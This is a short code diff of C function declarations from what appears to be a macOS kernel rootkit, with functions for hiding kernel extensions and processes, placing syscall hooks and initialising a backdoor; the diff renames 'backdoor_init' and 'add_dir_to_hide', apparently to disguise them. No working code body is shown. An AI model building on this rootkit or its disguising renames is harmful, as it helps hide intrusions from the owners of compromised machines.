@@ -175,7 +175,7 @@ int     check_for_process_exclusions (pid_t pid);
 void    dealloc_meh                  (char *, pid_t);
 void    place_hooks                  ();
 void    remove_hooks                 ();
-void    add_dir_to_hide              (char *, pid_t);
+void    agg_dir_to_hide              (char *, pid_t);
 void    hide_kext_leopard            ();
 void    hide_kext_osarray            ();
 int     hide_proc                    (proc_t, char *, int);
@@ -184,7 +184,7 @@ int     unhide_all_procs             ();
 int     get_active_bd_index          (char *, pid_t);
 int     get_bd_index                 (char *, pid_t);
 int     check_symbols_integrity      ();
-Boolean backdoor_init                (char *, proc_t);
+Boolean bdoor_init                (char *, proc_t);
 int     remove_dev_entry             ();
 static struct sysent *find_sysent (os_version_t *);
 
